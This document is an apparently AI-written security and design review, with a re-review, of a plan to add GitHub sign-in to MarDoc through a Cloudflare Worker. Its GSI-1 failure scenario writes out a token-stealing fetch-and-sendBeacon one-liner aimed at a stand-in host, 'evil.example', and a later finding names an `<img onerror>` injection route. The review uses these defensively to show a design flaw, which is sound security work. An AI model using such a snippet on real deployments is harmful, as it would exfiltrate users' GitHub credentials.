# Review GSI: L0 strategy page "Sign in with GitHub through a Worker route"

- **Reviewer:** independent design reviewer (Claude, Sonnet 5.5)
- **Date:** 2026-10-20
- **Kind / scope:** design, L0. `docs/design/github-sign-in/strategy.html` plus `diagrams/landscape.drawio` and `.svg`. The page, the diagram and the SDLC scaffold (`docs/design/mardoc/*`, `docs/risks.md`) are uncommitted working-tree files in the main checkout; I read them there and did not copy them.
- **Snapshot:** `2590742d6327efbb1952ed0ecc3bd171660e4862` (HEAD of this worktree; `src/` and `docs/known-issues.md` are identical in the main checkout).
- **Baseline (given):** sdlc-doclint 0/0, check_links, check_diagrams and render_check ALL PASS. I did not re-run them.
- **How:** read REVIEW.md, the L0 and "Why and problem" checklist blocks, writing-contract.md and design-levels.md. Read the page alone and wrote down the problem and the owner's questions before opening sources. Then fact-checked every claim against #146 (`gh issue view 146`), README.md, `docs/data-and-security.md`, `docs/known-issues.md`, `docs/setup-github-pat.md`, `docs/design/mardoc/requirements.md` (Q-1..Q-5), `src/lib/app-context.tsx`, `src/lib/github-api.ts`, `src/lib/rate-limit.ts`, `src/components/HtmlViewer.tsx` and the other iframes, `.github/workflows/deploy.yml`. Compared the drawio source and exported SVG to the text. Re-ran the Cloudflare check read-only (`dig NS`, `curl -I`).
- **Live checks:** none beyond that read-only lookup. Items that need a live zone are written as owner steps at the end.

## Verdict

**Safe for owner decision on direction, with fixes first.** The decision (a GitHub App plus one Worker route, Pages kept as origin) is sensible, it stays at L0, its code citations are correct, and its hypotheses are mostly labelled. But the page's security argument is overstated in the exact place the owner asked about (the HttpOnly cookie and same-origin claims), proof 3 would pass while the attack it is meant to rule out still works, the headline benefit ("two clicks") ignores the install step that #146 itself lists as the trade-off, and the page does not tell the owner that credentials will now pass through a MarDoc-operated Cloudflare Worker, which REVIEW.md treats as a project-specific check. Fix GSI-1 to GSI-4 before the owner is asked to approve; the rest can be fixed in the same pass.

Counts: **High 1, Medium 4, Low 6, Nit 2.**

## Problem in my own words (written from the page alone)

MarDoc is for non-engineers (PMs, designers, writers) who review documents in GitHub. Today it asks each of them to create a personal access token and paste it into the browser, where it lives in localStorage and, because rendered HTML runs same-origin, is readable by document scripts. The proposal is to replace that with a GitHub sign-in. GitHub's sign-in cannot finish in a static page (the client secret cannot ship in the page), so one small server-side step is needed. Cloudflare already fronts the domain, so that step can be a Worker route and hosting does not move.

Owner questions I wrote down before opening sources, and whether the page answers them:

| Question | Answered on the page? |
|---|---|
| What exactly am I approving, and by when? | Partly. Decision is in the h1 and "Recommended action"; no needed-by date (GSI-8). |
| Why not fine-grained PATs, a classic OAuth App, or another host? | No (GSI-5). |
| How much easier is it for a PM? | Claimed "two clicks"; install step and org approval absent (GSI-2). |
| Who can see tokens afterwards, and does the "no MarDoc server" promise survive? | Only for documents (GSI-3). |
| Is the cookie/same-origin design actually safe given SEC-01? | Claimed yes; wrong as worded (GSI-1). |
| What do I get if the spike fails or the proofs fail? | No. No fallback or stop condition per proof (GSI-4). |
| Who runs the Worker and what does it cost? | No (GSI-9). |

## Findings

| ID | Severity | Pass | Location | Summary |
|---|---|---|---|---|
| GSI-1 | High | Security | strategy.html:64, 71, 65 (Shape; Proof 3) | HttpOnly cookie and same-origin presented as protection; document scripts can still use the Worker. Proof 3 would pass with the hole open. |
| GSI-2 | Medium | Bugs | strategy.html:50-53 (Why) | "Two clicks" headline ignores the app-install step and org-owner approval that hit the target users. |
| GSI-3 | Medium | Compliance | strategy.html:65, 74 | Credentials and refresh handling pass through a MarDoc-operated Worker; "sees only the exchange, stores nothing" is inaccurate; REVIEW.md credential rule and doc updates not named. |
| GSI-4 | Medium | Compliance | strategy.html:67-71 (Decisions) | Proofs are not all measurable or "before implementation"; no pass/fail, time-box or consequence. |
| GSI-5 | Medium | Compliance | strategy.html:50-53, 74 | No alternatives; fine-grained PATs already give per-repo, expiring tokens, and "until someone deletes them" is overstated. |
| GSI-6 | Low | Compliance | strategy.html:59, 71 | SEC-01 treated as settled while Q-4 is PENDING; three iframes affected, page names one; fix has no owner or date. |
| GSI-7 | Low | Compliance | strategy.html:62-64 | Silently departs from #146's flow (callback path, state/PKCE, localStorage); the token hand-off to the app is undefined; the L0 line is crossed by naming a cookie. |
| GSI-8 | Low | Compliance | header, 74 | "When it is needed" missing (L0 checklist); no effort or time-box for the spike. |
| GSI-9 | Low | Bugs | strategy.html:65, 74 | Worker is a new production dependency; page names no owner, deployment path, secret custody or outage behaviour. |
| GSI-10 | Low | Compliance | strategy.html:56, 58 | Two citations do not support their claims (deploy.yml for Cloudflare; data-and-security.md for e2e reuse). |
| GSI-11 | Low | Compliance | diagram, strategy.html:62-64 | Diagram omits the two return hops the text depends on (GitHub redirect to the Worker; Worker result to the app). |
| GSI-12 | Nit | Compliance | strategy.html:57 | "GitHub returns the sign-in code to any page" is wrong as worded. |
| GSI-13 | Nit | Compliance | strategy.html:67 | Section titled "Decisions" holds proofs; the one decision lives in "Recommended action". |

### GSI-1 (High, Security): the cookie and same-origin claims give false assurance; proof 3 would not catch the real attack

**Location.** strategy.html:64 ("Because the Worker is on the same origin ... The refresh token can sit in a cookie that page scripts can't read, so even a leaked access token stops working within 8 hours") and line 71 (proof 3: "a script in rendered HTML can't read the access token or the refresh cookie").

**Finding.** An HttpOnly cookie stops scripts reading the refresh token. It does not stop scripts using it. The page makes the Worker same-origin with the app, and the rendered-HTML iframes are `srcDoc` with `sandbox="allow-scripts allow-same-origin"` (HtmlViewer.tsx:358, DiffViewer.tsx:1120, RepositoryReference.tsx:53), so their origin is `https://mardoc.app`. A script in a document can call the Worker's refresh route with the browser attaching the cookie, and receives a fresh access token in the response body. Same-origin is the property that makes this work; the page presents it as a benefit. The access token the app holds is also readable regardless of where it is stored, because a same-origin iframe can read `window.parent` memory, so "move it out of localStorage" does not help either (#146 floats sessionStorage or memory; those have the same exposure).

"Even a leaked access token stops working within 8 hours" is literally true of a copied string, but it implies bounded exposure. Exposure lasts as long as the victim has the page open and the script runs; each refresh also rotates the 6-month refresh token, so the attacker's loop is invisible to the user.

**Failure scenario.** Today (SEC-01 open) a reviewer opens a shared HTML report. Its script runs `fetch('/api/auth/refresh', {credentials:'include'}).then(r=>r.json()).then(t=>navigator.sendBeacon('https://evil.example', JSON.stringify(t)))`. Cookie is sent, a new 8-hour token is returned and exfiltrated, repeatable every few minutes for as long as the tab is open. Proof 3, as worded, checks only that the script "can't read the access token or the refresh cookie". It can pass (cookie unreadable, token in a closure) while this attack works. If SEC-01 is fixed by removing `allow-same-origin`, the iframe attack goes away, but then the cookie is not what protected the token; it was the sandbox, and any other same-origin script injection (Markdown/PR-description HTML, which known-issues SEC-01 also lists) still gets the same capability.

**Fix.** Reword line 64 to say what the cookie does and does not do ("a stolen copy of the refresh token is impossible; a script running on mardoc.app can still ask the Worker for tokens, so SEC-01 stays a hard prerequisite"). Remove "no cross-origin rules are involved" as a security point or label it a convenience. Rewrite proof 3 as: "a script running in rendered HTML, a Markdown/PR-description XSS payload, and a cross-site page each fail to obtain any access token from the Worker (test: script calls the refresh route and gets 401/403)". Note that the Worker needs a same-origin-only guard that does not rely on cookies alone (L1/L2 contract, a Q-n now).

### GSI-2 (Medium, Bugs): "Non-engineers can connect in two clicks" is a target stated as an outcome and omits the install step

**Location.** strategy.html:50 (headline), :52-53 ("Connecting takes about two clicks"; evidence box cites "the acceptance criteria in issue #146").

**Finding.** The two-click figure is the issue's acceptance criterion, not a measurement. #146 itself lists the first-time "install the app on repos" step as the trade-off. The page mentions an install link only inside proof 2. A GitHub App user token reaches only repos where the app is installed; installing on an organisation's repos needs an org owner (or an approval request to one). The page's target users (PMs, writers) are rarely org owners.

**Failure scenario.** A designer in an org signs in, consents, and sees an empty repository list or 404s on the repo their team uses. The install page says "Request" and waits for an owner. Time to first review is longer than today with a fine-grained PAT, and the headline promise failed for the audience it was written for.

**Fix.** Make the headline a claim the evidence supports ("Reviewers sign in once; repo owners install the app once"), mark two-click as the #146 target (hypothesis), add the install step and the org-owner approval as a named cost in "What improves" or in the proofs, and add a measurable success signal (for example, time from first visit to first loaded document in a repo the user can already read, for a user who is not an org owner).

### GSI-3 (Medium, Compliance): credentials will transit a MarDoc-operated Worker; the page frames privacy only for documents

**Location.** strategy.html:65 ("Key idea: the Worker sees only the sign-in exchange and stores nothing. Documents, comments and commits never pass through MarDoc.") and :74.

**Finding.** Three inaccuracies or omissions.
1. The Worker is not limited to the sign-in exchange: line 64 gives it the refresh cookie, which means it also handles every refresh (and #146 adds revoke via the Worker). It sees every access token it issues and the 6-month refresh token, i.e. every user's credential. Today no MarDoc-controlled host sees the PAT (README.md:9, data-and-security.md:15).
2. REVIEW.md project check: "Credentials and document content never reach a third-party host other than GitHub, unless the user configured one". Cloudflare is that third party and the owner has not been asked to accept an exception. No RK-n is proposed in `docs/risks.md`.
3. "Changing the README's 'no MarDoc server' statement" is named; `docs/data-and-security.md` (credential table, line 15), `docs/capabilities.md` and the PAT setup guide also change and REVIEW.md requires them to match.

**Failure scenario.** Owner approves from the page believing only a one-shot exchange is exposed. Later a Worker deploy bug logs request bodies, or the Cloudflare account or deploy token is compromised: every signed-in user's refresh token is captured, and these last six months. The "no MarDoc authentication server" statement in README.md:9 is false on the day the Worker ships.

**Fix.** State plainly that the Worker handles access and refresh tokens and the client secret, that this is a new trust boundary (Cloudflare account, deploy path), and ask the owner to accept it explicitly (RK-n in `docs/risks.md`, ADR after the spike). Replace "sees only the sign-in exchange" with what is true. List data-and-security.md and capabilities.md in the docs to change.

### GSI-4 (Medium, Compliance): the proofs are not all measurable, and not all "before implementation"

**Location.** strategy.html:67 (heading "3 proofs to settle before implementation") and :69-71.

**Finding.**
- Proof 1 has two parts. The round trip and the "every other path still serves Pages" check are measurable (the `x-github-request-id` header is a good pass signal). "Measures whether the token endpoint really rejects browser calls" has no pass criterion and does not change the decision: the client secret alone forces a server-side step, so the Worker is needed whichever way the measurement falls. It also has no time-box (line 74 says "time-boxed" but gives no limit) and no stated consequence if it fails (for example, route conflicts with the Pages custom domain, or the GitHub App cannot be registered under the org).
- Proof 2 requires built behaviour ("a repo without the app shows an install link", "PAT path and the localStorage-seeded e2e specs stay green"). That cannot be settled before implementation.
- Proof 3 is conditional on "SEC-01 fixed", so it proves the SEC-01 fix, not this design, and it is mis-specified (GSI-1). The page itself says it "gates release, not the spike", contradicting the heading.
- No proof addresses the Worker's own risk (what it logs, secret custody), or the "two clicks" success signal.

**Failure scenario.** The spike runs, returns a login, and the owner reads "proof 1 passed". Whether a non-owner PM can actually use it, or whether a refresh round trip works, is never tested, and proof 2 cannot be run until the UI exists. The heading says all three are done before code.

**Fix.** Rename the section "Proofs and the decision" (see GSI-13). Split into spike proofs (route works, token endpoint behaviour, one refresh round trip, secret kept out of the repo/build, a non-owner install attempt), build proofs (proof 2) and release gates (proof 3, rewritten). For each, give the observable pass condition, the time-box, and what the owner decides if it fails.

### GSI-5 (Medium, Compliance): no alternatives, and the benefit overlaps what fine-grained PATs already give

**Location.** strategy.html:52-53 (What improves), :74.

**Finding.** `docs/setup-github-pat.md` already supports fine-grained tokens that are limited to selected repos, carry an expiry date, and are resource-owner scoped. "MarDoc reaches only the repos the user or org installs it on, and access tokens expire after 8 hours instead of living until someone deletes them" is true against a classic PAT with no expiry, not against the fine-grained option the app already documents. The page also does not compare the classic OAuth App (simpler, coarse scope), other hosts for the exchange (Vercel/Netlify, listed in #146), or improving the PAT guide. The recommended Cloudflare Worker is justified only by "already there".

**Failure scenario.** Owner asks "why not just tell people to use fine-grained tokens and add a one-click link to the token page?" and the page has no answer. Or, after the spike, the owner learns the org blocks GitHub App installs as well as PATs, and no alternative had been weighed.

**Fix.** Add one short comparison (fine-grained PAT guide, classic OAuth App, GitHub App via Worker) with the reason for the choice, and narrow the benefit sentence to what the GitHub App adds beyond fine-grained PATs (no manual token creation; automatic expiry and refresh; org-approved app model).

### GSI-6 (Low, Compliance): SEC-01 prerequisite is asserted as settled; scope and schedule missing

**Location.** strategy.html:59, 71, 73.

**Finding.** The page states the SEC-01 fix is a prerequisite. The only record is requirements.md Q-4, which is PENDING, and the page does not cite Q-4 (it cites Q-3 and Q-5). It names one iframe (HtmlViewer.tsx:358, correct) but the same sandbox string is at DiffViewer.tsx:1120 and RepositoryReference.tsx:53. known-issues.md says "Priority: first" but gives no owner, WP or date, so the sign-in release is gated on an unscheduled item.

**Failure scenario.** SEC-01 is fixed in HtmlViewer only; proof 3 tests HtmlViewer; the DiffViewer HTML path still runs scripts same-origin and the token remains reachable.

**Fix.** Cite Q-4, list all three iframe sites, and give SEC-01 an owner and slot (a plan row), or say that sign-in ships behind it.

### GSI-7 (Low, Compliance): undeclared departure from #146 and a contract the page itself says belongs elsewhere

**Location.** strategy.html:62-64 versus #146 "Proposed flow" and Tasks.

**Finding.** #146 specifies a static `/auth/callback` page that checks `state`, posts `code` and `code_verifier` (PKCE) to the Worker, and stores tokens through `setGithubToken` initially in localStorage. The page changes this to a Worker-owned callback `mardoc.app/api/auth/callback` with a refresh cookie, and does not say it supersedes the issue. Two unanswered details follow: how the access token reaches the app after a top-level browser redirect to the Worker (URL fragment, short-lived cookie, or a follow-up fetch), and where `state` is validated now that the Worker, not a page, receives the redirect. Line 64 also says "Contracts, storage and refresh rules belong to the L1 and L2 design" in the same paragraph that already fixes storage (cookie). Q-5 records the cookie default, but the page presents it at L0.

**Failure scenario.** Maintainer follows #146's task list and builds `/auth/callback` plus localStorage storage; or builds the Worker callback and forgets state validation, enabling login CSRF (an attacker signs the victim in as the attacker's GitHub account and the victim's edits land in the attacker's repo).

**Fix.** Add a sentence saying this replaces #146's callback and storage design, and open Q-n rows (with defaults) for the token hand-off, state/PKCE placement, and cookie versus in-memory storage. Keep the cookie as "leading option", not a described behaviour.

### GSI-8 (Low, Compliance): L0 checklist item "when it is needed" is missing

**Location.** header (strategy.html:30-34) and :74.

**Finding.** The page names the decision and owner (Joe Barnett) but no needed-by date or trigger, and gives no effort estimate for the spike ("time-boxed" has no box).

**Failure scenario.** The "draft for decision" sits undecided with no consequence; the owner cannot tell whether this blocks a release.

**Fix.** Add "Decision needed by <date or milestone>" and the spike's time-box (for example, 1 day).

### GSI-9 (Low, Bugs): operating the Worker is not addressed

**Location.** strategy.html:65 and "Reused" at :58.

**Finding.** The repo deploys only Pages (`deploy.yml`: build, upload `out`, deploy-pages). A Worker needs its own source home, deploy path, Cloudflare credentials and a rotation plan for the client secret. If the Worker is down, sign-in fails; the PAT fallback is kept (good, line 58) but is not tied to a UI behaviour. Also a Worker route requires the apex record to stay proxied; if it is switched to DNS-only (for example, for a Pages certificate renewal), `/api/auth/*` silently falls through to Pages and returns 404.

**Failure scenario.** The DNS record is set to DNS-only while troubleshooting a Pages certificate; the sign-in callback returns the Pages 404 and no one knows why.

**Fix.** One line each on where the Worker lives, who deploys it, who holds the secret and what the user sees when it is down. Add to the spike: the Worker route survives a Pages deploy and fails visibly (not silently) if the proxy is off.

### GSI-10 (Low, Compliance): two citations do not support their claims

**Location.** strategy.html:56 and :58.

**Finding.** The Cloudflare sentence cites `deploy.yml`, which only shows a Pages build and deploy and says nothing about Cloudflare. The evidence is requirements.md Q-5. I re-checked it read-only on 2026-10-20: NS records are `tess.ns.cloudflare.com` and `nile.ns.cloudflare.com`, and `curl -I https://mardoc.app/` returns `server: cloudflare`, `cf-ray` and `x-github-request-id`. So the claim is correct, but the page's link does not prove it. The "e2e specs that seed the token keep working" sentence cites `data-and-security.md`, which does not mention e2e specs; the source is #146 and `e2e/*.spec.ts` (nine specs reference `mardoc_github_token`).

**Failure scenario.** A reader follows the deploy.yml link to verify the Cloudflare claim and finds none.

**Fix.** Cite Q-5 (with the date and headers) for the Cloudflare claim, and `e2e/` or #146 for the e2e claim.

### GSI-11 (Low, Compliance): diagram omits the hops the text depends on

**Location.** `diagrams/landscape.drawio` (and `.svg`, which match each other) against strategy.html:62-64.

**Finding.** The text has the user return from GitHub to `mardoc.app/api/auth/callback` and the Worker return the access token to the app. The diagram has no edge from GitHub App sign-in into the proxy/Worker and none from the Worker back to the app; the only app-to-GitHub-sign-in edge is "sign in and consent". The Worker is drawn as a dead end, so the diagram cannot explain how the token gets to the app, which is the open contract in GSI-7. The dashed-means-proposed convention is explained only inside the box labels.

**Failure scenario.** A maintainer reading the diagram builds a Worker that exchanges the code and returns nothing, or assumes the browser calls the GitHub App box twice.

**Fix.** Add two labelled edges (GitHub App to proxy/Worker: "redirect with code"; Worker to app: "access token") and a one-line legend.

### GSI-12 (Nit): "GitHub returns the sign-in code to any page"

strategy.html:57. GitHub redirects only to the app's registered callback URL. Saying "any page" suggests the code is open to any origin. Write "GitHub returns the sign-in code to the registered callback URL".

### GSI-13 (Nit): section headed "Decisions" contains proofs

strategy.html:67. The section number and anchor `#decisions` hold three proofs; the one decision is in the final paragraph. Retitle (see GSI-4).

## Checked and found sound

**Code citations at 2590742 (all correct).**
- `app-context.tsx:91` is `const TOKEN_KEY = "mardoc_github_token"`; `setGithubToken` stores it with `safeStorage` and calls `initOctokit` (lines 286-302). Restore on start at 313-317.
- `github-api.ts:43` is `export function initOctokit(token)`.
- `rate-limit.ts:139` is the `status === 401` branch of `isAuthError`; `formatApiError` turns it into "invalid or expired ... Open Settings to re-authenticate" (line 150-152). "a 401 response asks for a new token" is accurate.
- `HtmlViewer.tsx:358` is `sandbox="allow-scripts allow-same-origin"` on a `srcDoc` iframe. Same-origin as the parent is therefore accurate. (SEC-01 anchor `#sec-01-html-isolation` exists in known-issues.md.)

**Sources and interface claims.**
- README.md:9 and docs/data-and-security.md:15 support "no MarDoc server" and "PAT in localStorage"; the page correctly flags that README wording needs the owner's sign-off.
- requirements.md Q-3, Q-4, Q-5 exist and match the page's use of Q-3 and Q-5 (Q-5's default is exactly the page's route, same-origin, Pages kept, HttpOnly cookie). Q-3 says "spike first", which the page follows.
- The Cloudflare facts re-verified read-only (see GSI-10). Pages is confirmed as origin via `x-github-request-id`.
- #146's constraints (secret cannot ship in client; token endpoint lacks CORS; GitHub App advantages; install-link trade-off; VS Code separate) are reproduced faithfully; the page correctly marks the CORS statement "still to be measured". The VS Code extension is correctly scoped out.
- GitHub App user tokens (8-hour expiry with refresh, per-installation repo reach) match GitHub's documented behaviour; the page cites the right docs page. Note that expiry is an app setting ("Expire user authorization tokens"), on by default for new apps; mention it in the app registration step.
- Hypotheses are labelled: org PAT blocking ("a hypothesis from #146, not yet checked with any org") and drop-off at the PAT step ("no usage data").

**Level and form.**
- Declares L0 in meta and eyebrow; one decision, an owner, who benefits, evidence, reuse, three proofs, scope boundary and recommended action are all present. Headlines are claims, not topic labels (sdlc-doclint passing). Scope boundary is explicit (VS Code, hosting move, PAT removal, SEC-01 fix).
- No component cards, journeys, trade-off tables or L2 contracts are introduced; the only drift is the cookie detail (GSI-7).
- Static-export constraint (REVIEW.md) holds: the Worker lives outside the Next export, and `/api/*` does not exist in the export, so the route does not collide with a Pages path.
- Diagram: drawio and SVG labels match each other and the box names in the text ("proposed" versus "exists" marks are consistent with the situation section).

## Owner steps (live checks, not done by me)

1. On a test GitHub App and a throwaway Worker route on `mardoc.app/api/auth/*`: confirm the callback round trip, and that `https://mardoc.app/` still serves Pages (`x-github-request-id` present) after the route is added.
2. From a browser console on a different origin, `fetch('https://github.com/login/oauth/access_token', {method:'POST'})` and record whether the preflight/CORS fails (proof 1's measurement).
3. As a non-owner member of a test org, install the app on one repo and record whether approval is required and how long it takes (GSI-2).
4. With SEC-01 still open, from a script in a rendered HTML report, call the proposed refresh route and confirm whether it returns a token (GSI-1). Do this only against a test deployment and a throwaway account.

## Re-review

- **Date:** 2026-10-20
- **Fix commits:** none. The revised page, diagram, `docs/risks.md` (RK-1) and `docs/design/mardoc/requirements.md` (Q-6, Q-7) are uncommitted working-tree files in the main checkout (the commit hook fails on Node 26, Q-1). I re-read them there. Code citations unchanged at `2590742`.
- **Baseline (given):** sdlc-doclint 0/0, check_links (20 links), check_diagrams (8 edges), render_check ALL PASS. Not re-run by me.
- **How:** re-read the full revised strategy.html, the drawio and SVG (edge list and path coordinates), RK-1, Q-4..Q-7, and checked each original finding against the new text. No live checks. Housekeeping: I renamed the findings-table column "Sev" to "Severity" to match the report template; no finding text changed.

### Verdict

**Safe for owner decision.** The High is fixed and every Medium is fixed or reduced to a Low residual. The page no longer claims the cookie or same-origin protects the token, says a same-origin script can call the Worker, makes SEC-01 a stated prerequisite with RK-1, and proof 3 now tests the refresh route. What remains is Low: three Partly findings (GSI-3, GSI-7, GSI-9) and two new Low findings. None needs to block the owner's decision on direction; fix them in the L1 pass or the spike report.

Counts: original 13 = Fixed 10, Partly 3, Not fixed 0. New findings: Low 2.

| ID | Status | Evidence |
|---|---|---|
| GSI-1 | Fixed | The cookie and "no cross-origin rules" claims are gone. Situation "Blocking risk" now reads: three viewers run HTML as `mardoc.app`, "That exposes any token the app holds, and lets a script call the app's own endpoints", citing HtmlViewer.tsx:358, DiffViewer.tsx:1120, RepositoryReference.tsx:53, SEC-01, RK-1 and Q-4. Key idea: "It doesn't make rendered HTML safe, though: a same-origin script can still call it, so SEC-01 must ship first." Proof 3 is now "a script in rendered HTML can neither read app storage nor get a token from `/api/auth/refresh`", with "If it fails: no release of sign-in". RK-1 (risks.md:31) records the refresh-call exfiltration scenario, impact High, with mitigation "ship no sign-in until SEC-01 fixed and proof 3 passes". Residual in NI-GSI-1. |
| GSI-2 | Fixed | Headline is now "Reviewers sign in instead of making a token". "What improves" says "The first time, MarDoc also has to be installed on their repos, and on org repos that may need an org owner's approval." Evidence box: "'about 2 clicks' is a target, not a measurement". Proof 2 observes "a non-owner org member's install request ... end to end". Not added: a numeric success signal (for example time to first document); acceptable at L0 because the target is labelled a hypothesis. |
| GSI-3 | Partly | Fixed: "sees only the sign-in exchange" is replaced by "What changes for privacy: GitHub tokens now pass through a Worker that Joe Barnett operates, deployed with `wrangler`, with the secret held only in Cloudflare. The Worker stores nothing." The page says it handles refreshes, and that README, `data-and-security.md` and `capabilities.md` must change (Q-7). Key idea: "handles credentials only and never sees documents". Not fixed: no risk or acceptance record for the new credential trust boundary (RK-1 covers SEC-01 only); the page does not name Cloudflare as the third party or REVIEW.md's "credentials reach no third party but GitHub" rule; it does not say that a Worker or Cloudflare-account compromise exposes every user's refresh token. Residual Low: add an RK row (SEC) or ask for acceptance in the spike ADR. |
| GSI-4 | Fixed | Section retitled "One direction to approve, and three proofs that can reverse it". Proof 1: "time-boxed to 2 days", observable pass (login returned, `x-github-request-id` on other paths), "If it fails: move the Worker to `auth.mardoc.app`". The CORS measurement is dropped, and Situation now says the server step is needed "whether or not GitHub's token endpoint accepts browser calls". Proof 2 moved into the spike and made testable ("reaches a repo where the test app is installed and gets 404 on one where it isn't"; failure: revisit classic OAuth App with an ADR). Proof 3 is explicitly a "Release gate" with a stated consequence. The "before implementation" heading is gone. |
| GSI-5 | Fixed | New "Alternatives considered" table: fine-grained PATs only, classic OAuth App, Worker on `auth.mardoc.app`, each with a reason. "What improves" acknowledges "MarDoc already supports fine-grained PATs, which are per-repo and expiring, but users still have to make and paste them by hand." The "until someone deletes them" overstatement is removed. |
| GSI-6 | Fixed | Q-4 is cited in "Blocking risk" and the scope boundary; all three iframe sites are cited (lines verified earlier). The scope line says SEC-01 is "a prerequisite whose owner and date are still open (Q-4)", which is honest and matches Q-4 being PENDING. RK-1 gates release on it. |
| GSI-7 | Partly | Fixed: "This puts the callback in the Worker rather than on a static `/auth/callback` page as #146 sketched"; the HttpOnly-cookie storage statement is removed; "Token storage, the hand-off to the app and the CSRF details belong to the L1 and L2 design" (cites Q-3, Q-5). Not fixed: no Q-n row was opened for the token hand-off, `state`/PKCE placement or storage, PKCE (in #146) is not mentioned, and Q-5 still carries the cookie default. Residual Low: open one Q-n with a recommended default before L1. |
| GSI-8 | Fixed | Header: "Decision needed by 2026-10-27 (default, Q-6)"; Q-6 exists (requirements.md:125) with default 2026-10-27; spike time-boxed to 2 days; "Owner: Joe Barnett, by 2026-10-27". |
| GSI-9 | Partly | Fixed: operator (Joe Barnett), deploy tool (`wrangler`), secret custody ("held only in Cloudflare") and outage behaviour ("If it is down, sign-in and refresh fail, and the PAT option keeps working") are stated, backed by Q-7 (requirements.md:126). Not fixed: the DNS-only/unproxied fall-through (Worker route silently replaced by a Pages 404) is not in proof 1, which only checks that other paths still serve Pages. Residual Low: add "route fails visibly with the proxy off" to the spike checklist. |
| GSI-10 | Fixed | The Cloudflare sentence now cites Q-5 (requirements.md:124, which holds the NS and header evidence). The e2e-reuse sentence now cites #146. deploy.yml is no longer cited for Cloudflare. |
| GSI-11 | Fixed | drawio has two new edges, `oauth-worker` "redirect with code" and `worker-app` "access token" (lines 59 and 62). The SVG contains both paths with arrowheads; `worker-app` runs along x=240 in the lane gap and does not cross the `mardoc.app/*` label. The inline-svg component and edge lists in strategy.html include `oauth worker` and `worker app` (one data-edge each in the page). The figcaption now says "Dashed boxes are proposed." Residual alt-text issue in NI-GSI-2. |
| GSI-12 | Fixed | Situation now says "GitHub sends the sign-in code back only to the app's registered callback URL." |
| GSI-13 | Fixed | Section 04 is now "Decision: One direction to approve, and three proofs that can reverse it", and the Recommended action sits inside it. |

### New findings

| ID | Severity | Pass | Location | Finding |
|---|---|---|---|---|
| NI-GSI-1 | Low | Security | strategy.html, proof 3 | Proof 3 tests only a script in rendered HTML. Other same-origin script injection (Markdown or PR-description HTML, which known-issues SEC-01 also lists) and a cross-site caller are untested. **Scenario:** SEC-01 is fixed for the three iframes, proof 3 passes, and a Markdown renderer later emits an unsanitised `<img onerror>` that calls `/api/auth/refresh` and gets a token. **Fix:** add to proof 3: an injected-script payload from Markdown/PR-description content, and a cross-site `fetch` to `/api/auth/refresh` that must be refused. |
| NI-GSI-2 | Low | Compliance | strategy.html, inline-svg `label` (alt text) | The diagram's accessible description is unchanged: it ends "...exchanges the sign-in code with GitHub. The app calls the GitHub API directly." and omits the two new return hops (GitHub redirect with code to the Worker; access token back to the app). **Scenario:** a screen-reader user is told the Worker only exchanges the code and never learns how the token reaches the app, which the drawing and text now show. **Fix:** extend the `label` string with the two hops. |

### Checked in the fixes and found sound

- The revised text adds no L2 structure: storage, hand-off and CSRF are deferred to L1/L2, and the Worker `state` check is stated as behaviour, not a contract.
- The alternatives table is accurate to `docs/setup-github-pat.md` (fine-grained PATs per-repo and expiring) and to #146 (classic OAuth App has coarse scope and still needs a Worker).
- RK-1's scenario, likelihood (Medium) and impact (High) match the Situation text, and its mitigation matches proof 3. RK-2 in risks.md is an untouched template placeholder row.
- Q-6 and Q-7 are PENDING with recommended defaults, as the repo rules require, and the page cites them where it uses them.
- Hypotheses stay labelled (org PAT blocking, two clicks, no drop-off data).
- Code citations are unchanged and still correct at `2590742` (app-context.tsx:91, github-api.ts:43, rate-limit.ts:139, the three sandbox lines).
